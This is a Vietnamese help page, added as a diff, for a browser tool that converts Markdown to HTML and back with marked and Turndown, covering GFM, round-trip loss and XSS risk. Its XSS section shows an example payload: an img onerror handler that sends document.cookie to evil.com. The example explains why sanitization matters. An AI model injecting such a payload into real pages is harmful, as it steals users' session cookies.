@@ -1,0 +1,98 @@
+---
+title: Hướng dẫn chuyển đổi Markdown sang HTML và ngược lại
+description: Cách marked và Turndown hoạt động, CommonMark vs GFM, rủi ro XSS từ raw HTML trong Markdown, syntax highlighting, và round-trip lossiness.
+updated: 2026-05-26
+---
+
+## Tại sao cần convert giữa Markdown và HTML
+
+Markdown là format để viết — gõ nhanh, dễ đọc ở dạng source, portable giữa các editors. HTML là format để render — thứ trình duyệt thực sự hiển thị, email clients gửi đi, CMS platforms lưu trữ. Hai format phục vụ các giai đoạn khác nhau trong cùng một content lifecycle:
+
+- Migrate blog từ static site generator dùng Markdown sang CMS lưu HTML
+- Lấy HTML từ WYSIWYG editor và convert sang Markdown cho docs repository
+- Render Markdown thành HTML cho email templates hay PDF generation
+- Xem Markdown snippet sẽ tạo ra HTML gì trước khi deploy
+
+## Markdown sang HTML: cách `marked` hoạt động
+
+Tool này dùng [marked](https://marked.js.org/), một trong những Markdown parser JavaScript nhanh nhất và được deploy rộng rãi nhất. Nó convert Markdown source thành HTML string trong một synchronous pass.
+
+marked hỗ trợ cả **CommonMark** (Markdown spec chặt chẽ và không mơ hồ) và **GitHub Flavored Markdown (GFM)** extensions. GFM được bật mặc định vì đó là thứ hầu hết developer mong đợi — nó thêm:
+
+- **Tables** — Cú pháp pipe `| col | col |`
+- **Strikethrough** — `~~text~~`
+- **Task lists** — `- [ ] item` / `- [x] item`
+- **Autolinks** — URLs trần thành clickable links tự động
+- **Fenced code blocks** — Triple-backtick ` ``` ` với optional language hint
+
+Tắt GFM mode nếu cần strict CommonMark compliance.
+
+## Rủi ro XSS: raw HTML trong Markdown
+
+Markdown cho phép nhúng raw HTML. Điều này có chủ đích — cho phép tác giả làm những thứ Markdown syntax không hỗ trợ, như `<details>`, `<sub>`, `<kbd>`. Nhưng nó cũng có nghĩa **Markdown từ nguồn không tin cậy là XSS vector**:
+
+```markdown
+Đoạn văn bình thường.
+
+<script>alert('XSS')</script>
+
+<img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">
+```
+
+Nếu render mà không sanitize, script và event handler sẽ chạy trong browser của người dùng. Điều này quan trọng khi bạn nhận Markdown từ người dùng — blog comments, user profiles, wiki pages, issue trackers.
+
+Tùy chọn sanitization của tool chạy HTML output qua [DOMPurify](https://github.com/cure53/DOMPurify) sau khi render, loại bỏ `<script>` tags, `javascript:` hrefs, event handler attributes (`onerror`, `onclick`, …). Bật sanitization khi Markdown source đến từ user input. Với nội dung của bạn — docs, blog posts, README files — sanitization là tùy chọn vì bạn tin source.
+
+## HTML sang Markdown: cách Turndown hoạt động
+
+Convert HTML ngược về Markdown dùng [Turndown](https://github.com/mixmark-io/turndown), library walk qua HTML DOM tree và map từng element sang Markdown tương đương. Conversion dựa trên rules:
+
+- `<h1>` → `# Heading`
+- `<strong>` → `**bold**`
+- `<a href="url">text</a>` → `[text](url)`
+- `<ul><li>` → `- item`
+- `<pre><code>` → fenced code block
+- `<table>` → GFM pipe table (cần GFM plugin)
+
+## Round-trip lossiness: những gì không survive
+
+Convert Markdown → HTML → Markdown (hay ngược lại) là lossy. Đừng kỳ vọng round-trips là idempotent:
+
+**Mất trong Markdown→HTML→Markdown:**
+- Setext-style headings (`===` underlines) thành ATX-style (`#`)
+- Reference-style links `[text][ref]` thành inline links `[text](url)`, reference definitions biến mất
+- HTML comments `<!-- … -->` có thể bị bỏ bởi sanitization
+- Indented code blocks có thể thành fenced
+- Custom HTML mà Turndown không có rule thành raw HTML block hoặc bị drop
+
+**Mất trong HTML→Markdown:**
+- CSS classes và inline styles — Markdown không có styling
+- `id` attributes — Markdown headings không có ID syntax
+- Complex table features: colspan, rowspan, merged cells
+- `<div>` và generic containers không có Markdown equivalent
+
+Với one-way publishing pipelines (viết bằng Markdown, publish dạng HTML), lossiness không quan trọng. Với bidirectional editing thì có.
+
+## Syntax highlighting
+
+Fenced code blocks với language hint tạo ra `<code class="language-js">` trong HTML output. Syntax highlighting không được áp dụng bởi converter — đó là rendering step do các library như [Prism](https://prismjs.com/) hay [highlight.js](https://highlightjs.org/) thực hiện trong browser hoặc build step. Language class được giữ trong output để highlighting library của bạn có thể pick up.
+
+## Nhúng HTML trong Markdown
+
+Khi HTML được nhúng trong Markdown và GFM mode được bật, marked xử lý HTML blocks nguyên vẹn. Một gotcha phổ biến: phải có blank line phân cách HTML blocks khỏi Markdown paragraphs:
+
+```markdown
+Một đoạn văn trên.
+
+<div class="note">
+Đây là raw HTML trong Markdown.
+</div>
+
+Một đoạn văn dưới.
+```
+
+Thiếu blank lines quanh `<div>`, behavior phụ thuộc vào parser. Blank lines là yêu cầu của CommonMark spec và được marked tuân thủ.
+
+## Privacy
+
+Toàn bộ conversion chạy trong browser dùng marked và Turndown. Nội dung của bạn không bao giờ được gửi lên server. Cả hai library đều MIT-licensed.
